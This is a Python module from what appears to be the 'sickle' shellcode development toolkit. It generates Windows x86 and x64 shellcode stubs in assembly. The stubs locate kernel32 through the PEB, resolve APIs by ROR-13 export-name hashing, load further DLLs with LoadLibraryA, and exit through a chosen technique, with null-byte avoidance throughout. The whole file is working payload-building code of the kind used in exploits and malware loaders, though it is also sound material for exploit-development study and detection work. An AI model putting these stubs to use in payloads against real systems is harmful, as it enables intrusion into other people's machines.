import struct

from sickle.common.lib.generic import convert
from sickle.common.lib.reversing import smartarch

from sickle.common.headers.windows import (
    winnt,
    ntdef,
    winternl,
)

class WinRawr():
    """This class is responsible for generating varous shellcode stubs in the "traditional"
    manor you expect to see in most shellcode. Keep in mind there are multiple ways to do
    what you see :P
    """

    def __init__(self, storage_offsets, dependencies, stack_space, exitfunc):

        self.storage_offsets = storage_offsets
        self.dependencies = dependencies
        self.stack_space = stack_space
        self.exit_technique = exitfunc

    def gen_source(self, main_func):

        if smartarch.arch_used == "x64":

            src  = self.get_prologue()
            src += self.get_resolver()

            src += main_func

            if self.exit_technique != None:
                src += self.get_epilogue()

            src += self.get_kernel32_stub()
            src += self.get_lookup_stub()

        elif smartarch.arch_used == "x86":

            src = self.get_prologue()
            src += self.get_kernel32_stub()
            src += self.get_lookup_stub()
            src += self.get_resolver()

            src += main_func

            if self.exit_technique != None:
                src += self.get_epilogue()

        return src

    def get_kernel32_stub(self):
        """Generates stub for obtaining the base address of Kernel32.dll
        """

        if smartarch.arch_used == "x64":

            stub = f"""
getKernel32:
    push rbp
    mov rbp, rsp
    mov dl, 0x4b
getPEB:
    mov rcx, 0x60
    mov r8, gs:[rcx]
getHeadEntry:
    mov rdi, [r8 + {winternl._PEB.Ldr.offset}]
    mov rdi, [rdi + {winternl._PEB_LDR_DATA.InLoadOrderModuleList.offset}]
search:
    xor rcx, rcx
    mov rax, [rdi + {winternl._LDR_DATA_TABLE_ENTRY.DllBase.offset}]
    mov rsi, [rdi + {winternl._LDR_DATA_TABLE_ENTRY.BaseDllName.offset + ntdef._UNICODE_STRING.Buffer.offset}]
    mov rdi, [rdi]
    cmp [rsi + 0x18], cx
    jne search
    cmp [rsi], dl
    jne search
found:
    leave
    ret\n"""

        elif smartarch.arch_used == "x86":

            stub = f"""
getKernel32:
    mov dl, 0x4b
getPEB:
    xor ebx, ebx
    xor ecx, ecx
    mov bl, 0x30
    mov edi, fs:[ebx]
    mov edi, [edi + {winternl._PEB.Ldr.offset}]
    mov edi, [edi + {winternl._PEB_LDR_DATA.InLoadOrderModuleList.offset}]
search:
    mov eax, [edi + {winternl._LDR_DATA_TABLE_ENTRY.DllBase.offset}]
    mov esi, [edi + {winternl._LDR_DATA_TABLE_ENTRY.BaseDllName.offset + ntdef._UNICODE_STRING.Buffer.offset}]    
    mov edi, [edi]
    cmp [esi + 0x18], cx
    jne search
    cmp [esi], dl
    jne search
found:
    jmp resolveFunctions\n"""

        return stub

    def get_lookup_stub(self):
        """Generates the stub responsible for obtaining the base address of a function
        """

        if smartarch.arch_used == "x64":
            
            stub = f"""
lookupFunction:
    push rbp
    mov rbp, rsp
    mov ebx, [rdi + {winnt._IMAGE_DOS_HEADER.e_lfanew.offset}]
    add rbx, {winnt._IMAGE_NT_HEADERS64.OptionalHeader.offset + winnt._IMAGE_OPTIONAL_HEADER64.DataDirectory.offset}
    add rbx, rdi
    mov eax, [rbx]
    mov rbx, rdi
    add rbx, rax
    mov eax, [rbx + {winnt._IMAGE_EXPORT_DIRECTORY.AddressOfFunctions.offset}]
    mov r8, rdi
    add r8, rax
    mov rcx, [rbx + {winnt._IMAGE_EXPORT_DIRECTORY.NumberOfFunctions.offset}]
parseNames:
    jecxz error
    dec ecx
    mov eax, [r8 + rcx * 4]
    mov rsi, rdi
    add rsi, rax
    xor r9, r9
    xor rax, rax
    cld
calcHash:
    lodsb
    test al, al
    jz calcDone
    ror r9d, 0xD
    add r9, rax
    jmp calcHash
calcDone:
    cmp r9d, edx
    jnz parseNames
findAddress:
    mov r8d, [rbx + {winnt._IMAGE_EXPORT_DIRECTORY.AddressOfNames.offset}]
    add r8, rdi
    xor rax, rax
    mov ax, [r8 + rcx * 2]
    mov r8d, [rbx + {winnt._IMAGE_EXPORT_DIRECTORY.NumberOfNames.offset}]
    add r8, rdi
    mov eax, [r8 + rax * 4]
    add rax, rdi
error:
    leave
    ret\n"""

        elif smartarch.arch_used == "x86":

            stub = f"""
lookupFunction:
    push ebp
    mov ebp, esp
    sub esp, 0x08
    xor ebx, ebx
    mov [ebp - 0x04], ebx       ; [EBP+0x08] will serve as a temporary register (x64 has less registers)
    mov [ebp - 0x08], edx       ; Argv passed into lookupFunction
    mov ebx, [edi + {winnt._IMAGE_DOS_HEADER.e_lfanew.offset}]
    add ebx, {winnt._IMAGE_NT_HEADERS.OptionalHeader.offset + winnt._IMAGE_OPTIONAL_HEADER.DataDirectory.offset}
    add ebx, edi
    mov eax, [ebx]
    mov ebx, edi
    add ebx, eax
    mov eax, [ebx + {winnt._IMAGE_EXPORT_DIRECTORY.AddressOfFunctions.offset}]
    mov edx, edi
    add edx, eax
    mov ecx, [ebx + {winnt._IMAGE_EXPORT_DIRECTORY.NumberOfFunctions.offset}]
    mov [ebp - 0x04], ebx       ; Backup EBX since we are going to XOR it
parseNames:
    jecxz error
    dec ecx
    mov eax, [edx + ecx * 4]
    mov esi, edi
    add esi, eax
    xor eax, eax
    xor ebx, ebx
    cld
calcHash:
    lodsb
    test al, al
    jz calcDone
    ror ebx, 0xD
    add ebx, eax
    jmp calcHash
calcDone:
    cmp ebx, [ebp - 0x08]
    jnz parseNames
findAddress:
    mov ebx, [ebp - 0x04]       ; Restore EBX value prevously saved
    mov edx, [ebx + {winnt._IMAGE_EXPORT_DIRECTORY.AddressOfNames.offset}]
    add edx, edi
    xor eax, eax
    mov ax, [edx + ecx * 2]
    mov edx, [ebx + {winnt._IMAGE_EXPORT_DIRECTORY.NumberOfNames.offset}]
    add edx, edi
    mov eax, [edx + eax * 4]
    add eax, edi
error:
    leave
    ret
resolveFunctions:
    mov edi, eax\n"""

        return stub

    def get_loader_stub(self, lib):
        """Generates the stub to load a library not currently loaded into a process
        """

        if smartarch.arch_used == "x64":

            lists = convert.from_str_to_xwords(lib)
            write_index = self.storage_offsets['functionName']

            stub = "\nload_library_{}:\n".format(lib.rstrip(".dll"))

            for i in range(len(lists["QWORD_LIST"])):
                stub += "    mov rcx, 0x{}\n".format( struct.pack('<Q', lists["QWORD_LIST"][i]).hex() )
                stub += "    mov [rbp-{}], rcx\n".format(hex(write_index))
                write_index -= 8

            for i in range(len(lists["DWORD_LIST"])):
                stub += "    mov ecx, dword 0x{}\n".format( struct.pack('<L', lists["DWORD_LIST"][i]).hex() )
                stub += "    mov [rbp-{}], ecx\n".format(hex(write_index))
                write_index -= 4

            for i in range(len(lists["WORD_LIST"])):
                stub += "    mov cx, 0x{}\n".format( struct.pack('<H', lists["WORD_LIST"][i]).hex() )
                stub += "    mov [rbp-{}], cx\n".format(hex(write_index))
                write_index -= 2

            for i in range(len(lists["BYTE_LIST"])):
                stub += "    mov cl, {}\n".format( hex(lists["BYTE_LIST"][i]) )
                stub += "    mov [rbp-{}], cl\n".format(hex(write_index))
                write_index -= 1

            stub += f"""    xor rcx, rcx
    mov [rbp-{write_index}], cl
    lea rcx, [rbp - {self.storage_offsets['functionName']}]
    mov rax, [rbp - {self.storage_offsets['LoadLibraryA']}]
    call rax"""

        elif smartarch.arch_used == "x86":

            lists = convert.from_str_to_xwords(lib, 0x04)
            write_index = self.storage_offsets["functionName"]

            stub = "\nload_library_{}:\n".format(lib.rstrip(".dll"))

            for i in range(len(lists["DWORD_LIST"])):
                stub += "    mov ecx, 0x{}\n".format( struct.pack('<L', lists["DWORD_LIST"][i]).hex() )
                stub += "    mov [ebp-{}], ecx\n".format(hex(write_index))
                write_index -= 4

            for i in range(len(lists["WORD_LIST"])):
                stub += "    mov cx, 0x{}\n".format( struct.pack('<H', lists["WORD_LIST"][i]).hex() )
                stub += "    mov [ebp-{}], cx\n".format(hex(write_index))
                write_index -= 2

            for i in range(len(lists["BYTE_LIST"])):
                stub += "    mov cl, {}\n".format( hex(lists["BYTE_LIST"][i]) )
                stub += "    mov [ebp-{}], cl\n".format(hex(write_index))
                write_index -= 1

            stub += f"""
    xor ecx, ecx
    mov [ebp - {write_index}], cl
    lea ecx, [ebp - {self.storage_offsets['functionName']}]
    push ecx
    mov eax, [ebp - {self.storage_offsets['LoadLibraryA']}]
    call eax"""

        return stub

    def get_resolver(self):
        """This function is responsible for loading all libraries and resolving respective functions
        """

        if smartarch.arch_used == "x64":

            stub = ""
            for lib, imports in self.dependencies.items():
                if (lib != "Kernel32.dll"):
                    stub += self.get_loader_stub(lib)
                    stub += """
    mov rdi, rax
                """

                for func in range(len(imports)):
                    stub += f"""
get_{imports[func]}:
    mov rdx, {convert.from_str_to_win_hash(imports[func])}
    call lookupFunction
    mov [rbp - {self.storage_offsets[imports[func]]}], rax
                """

        elif smartarch.arch_used == "x86":

            stub = ""
            for lib, imports in self.dependencies.items():
                if (lib != "Kernel32.dll"):
                    stub += self.get_loader_stub(lib)
                    stub += """
    mov edi, eax
                """

                for func in range(len(imports)):
                    stub += f"""
get_{imports[func]}:
    mov edx, {convert.from_str_to_win_hash(imports[func])}
    call lookupFunction
    mov [ebp - {self.storage_offsets[imports[func]]}], eax
                """

        return stub


    def get_prologue(self):
        """This function will generate a generic function prologue based on the flags provided
        by the user.
        """

        if smartarch.arch_used == "x64":

            stub = "_start:\n"
    
            if self.exit_technique == "func":
                stub += """    push rbp
        mov rbp, rsp\n"""
    
            stub += f"    sub rsp, {self.stack_space}\n"
    
            if self.exit_technique != "func":
                stub += "    and rsp, 0xfffffffffffffff0\n"
  
            stub += """    call getKernel32
    mov rdi, rax\n"""

        elif smartarch.arch_used == "x86":

            stub = "_start:\n"

            if self.exit_technique == "func":
                stub += f"""    push ebp
    mov ebp, esp\n"""

            stub += f"""    ; Allocate the stack space with the use of AL of EAX in order to avoid a NULL byte
    xor eax, eax
    mov al, {self.stack_space}
    sub esp, eax\n"""

            if self.exit_technique != "func":
                stub += "    and esp, 0xFFFFFFF0\n"

        return stub
    
    def get_epilogue(self):
        """This function will generate a generic function epilogue based on the flags provided
        by the user.
        """

        if smartarch.arch_used == "x64":

            stub = ""
   
            if self.exit_technique == "func":
                stub += f"""fin:
    leave
    ret\n"""

            elif self.exit_technique == "thread":
                stub += f"""
; RAX => RtlExitUserThread([in] DWORD dwExitCode); // RCX => 0
call_RtlExitUserThread:
    xor rcx, rcx
    mov rax, [rbp - {self.storage_offsets['RtlExitUserThread']}]
    call rax\n"""
    
            elif self.exit_technique == "process":
                stub += f"""
; RAX => ExitProcess([in] UINT uExitCode); // RCX => 0
call_ExitProcess:
    xor rcx, rcx
    mov rax, [rbp - {self.storage_offsets['ExitProcess']}]
    call rax\n"""
    
            elif self.exit_technique == "terminate":
                stub += f"""
; RAX => TerminateProcess([in] HANDLE hProcess,   // RCX => -1 (Current Process)
;                         [in] UINT   uExitCode); // RDX => 0x00 (Clean Exit)
call_TerminateProcess:
    xor rcx, rcx
    dec rcx
    xor rdx, rdx
    mov rax, [rbp - {self.storage_offsets['TerminateProcess']}]
    call rax\n"""
        
        if smartarch.arch_used == "x86":

            stub = ""

            if self.exit_technique == "func":
                stub += """fin:
    leave
    ret\n"""

            elif self.exit_technique == "thread":
                stub += f"""
; EAX => RtlExitUserThread([in] DWORD dwExitCode);
call_RtlExitUserThread:
    xor ecx, ecx
    push ecx
    mov eax, [ebp - {self.storage_offsets['RtlExitUserThread']}]
    call eax\n"""

            elif self.exit_technique == "process":
                stub += f"""
; EAX => ExitProcess([in] UINT uExitCode); // RCX => 0
call_ExitProcess:
    xor ecx, ecx
    mov eax, [ebp - {self.storage_offsets['ExitProcess']}]
    call eax\n"""

            elif self.exit_technique == "terminate":
                stub += f"""
; EAX => TerminateProcess([in] HANDLE hProcess,
;                         [in] UINT   uExitCode);
call_TerminateProcess:
    xor ecx, ecx
    push ecx
    dec ecx
    push ecx
    mov eax, [ebp - {self.storage_offsets['TerminateProcess']}]
    call eax\n"""

        return stub
